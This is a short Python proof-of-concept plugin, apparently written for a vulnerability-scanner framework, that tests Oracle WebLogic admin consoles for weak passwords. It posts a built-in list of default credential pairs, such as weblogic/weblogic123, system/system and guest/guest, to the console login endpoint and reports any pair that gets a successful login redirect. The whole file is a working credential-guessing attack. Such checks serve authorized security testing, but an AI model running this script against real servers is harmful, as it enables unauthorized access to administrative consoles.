# Author:w8ay
# Name:测试DEMO

import HackRequests


def poc(arg, **kwargs):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = "/console/j_security_check"
    passwd = ["weblogic", "weblogic1", "weblogic12", "weblogic123", "admin", "admin123"]
    vulnurl = arg + payload
    dict_pwd = []
    for pwd in passwd:
        dict_pwd.append(("weblogic",pwd))
    dict_pwd.append(("system", "system"))
    dict_pwd.append(("portaladmin", "portaladmin"))
    dict_pwd.append(("guest", "guest"))

    hh = HackRequests.http(vulnurl)
    if hh.status_code != 200:
        return False


    for account in dict_pwd:
        username = account[0]
        passwd = account[1]
        post_data = {
            "j_username": username,
            "j_password": passwd
        }
        try:
            hh = HackRequests.http(vulnurl,post = post_data, headers = headers,location = False)
            if hh.status_code == 302 and r"console" in hh.text():
                result = {
                    "name": "weblogic 弱口令",  # 插件名称
                    "content": "存在weblogic弱口令 INFO:{}".format(repr(post_data)),  # 插件返回内容详情，会造成什么后果。
                    "url": vulnurl,  # 漏洞存在url
                    "log": hh.log,
                    "tag": "info_leak"  # 漏洞标签
                }
                return result

        except:
            pass


if __name__ == "__main__":
    pass